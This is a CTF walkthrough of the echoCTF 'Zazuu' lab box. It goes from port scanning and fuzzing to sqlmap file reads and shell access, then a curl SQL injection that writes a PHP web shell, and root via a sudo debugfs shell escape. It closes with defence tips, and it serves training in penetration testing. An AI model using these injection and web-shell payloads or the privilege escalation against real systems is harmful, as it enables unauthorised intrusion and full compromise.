---
layout: terminal
title: "Zazuu EchoCTF (Guru)-Writeup"
date: 2025-12-23 2:00:00 +0000
author: onyx
categories: [CTF, Writeup]
tags: [echoCTF]
---

### Reconnaissance And Scanning
As usual, I fired an nmap scan at the target and found an open port which was `port 80`.
```bash
nmap -v -sV <target_ip>
```
![](/assets/zazuu%20echoctf/1.png)

### Enumeration
I visited the web application and got greeted with a nice web application named Birdim. 

![](/assets/zazuu%20echoctf/2.png)

After further navigation, I decided to fuzz the site to discover subdomains.
```bash
ffuf -u <url>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
I discovered some subdomains including index.php and media
![](/assets/zazuu%20echoctf/3.png)

I tried visiting the `/media` directory but unfortunately, it was forbidden.
Since I found nothing really interesting, I went back to the web application and found the subscription section which was the only field that accept inputs. I decided to test it for SQL injection since mostly, input fields have SQL injection vulnerabilities.

![](/assets/zazuu%20echoctf/4.png)

### Exploitation
I captured the request with burpsuite and saved it into a file so I can automate the process with `sqlmap`. I first attempted a file read with the command:
```bash 
sqlmap -r <request_file> --file-read=/etc/passwd
```
and this was successful.
![](/assets/zazuu%20echoctf/5.png)
I went ahead to trigger a shell by using the `--os-shell` flag.
```bash
sqlmap -r <request_file> --os-shell
```
when asked for the path, I provided `/var/www/html/media`. */var/www/html* because that's mostly the default web root directory for web applications, and */media* because that's where media files are stored and there's a probability that I have write privileges there. This was successful.
![](/assets/zazuu%20echoctf/6.png)

*ALTERNATIVE*

This can be also be achieved using the curl command:
```bash
curl -X POST http://<target_ip>/ -s \
  -d "mail-list=a@a.com' UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system(\$_GET[\"cmd\"]); ?>','' INTO OUTFILE '/var/www/html/media/shell.php'#" \
  -H "Content-Type: application/x-www-form-urlencoded"
```
and accessed on the webpage at:

```bash
http://<target_ip>/media/shell.php?cmd=<command>
```

For confirmation, I first executed the command `id` and it was successful so I sent a reverse shell connection.

![](/assets/zazuu%20echoctf/8.png)
![](/assets/zazuu%20echoctf/9.png)

I stabilized the shell with these commands:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```bash
ctrl +z
```
```bash
stty raw -echo;fg
```
```bash
reset
```
```bash
export TERM=xterm
```
### Privilege Escalation
After initial foothold, the next thing is to escalate privileges to root.
I checked my sudo permissions and found `/sbin/debugfs`.

I ran `sudo /sbin/debugfs` (*i always do this to observe script behavior*) and got provided with a field that requires my input. I typed `!/bin/bash` (*which is normally used for shell escape*). This spawned me directly into root shell.

![](/assets/zazuu%20echoctf/10.png)

### TL;DR
    Discovery: Found port `80` open with "Birdim" web app

    Enumeration: Discovered /media directory via fuzzing

    Exploitation:

        SQL injection in `email subscription field`

        Used sqlmap to read /etc/passwd

        Got shell via `--os-shell` writing to `/var/www/html/media/`

    Privilege Escalation:

        Found sudo `/sbin/debugfs` permission

        Escaped to root via `!/bin/bash` in debugfs

### Defense Recommendations
    Input validation: Sanitize all user inputs
    Least privilege: Restrict MySQL FILE privilege
    Directory permissions: Secure upload directories
    SUID audit: Regular review of sudo permissions

![](/assets/finishing.gif)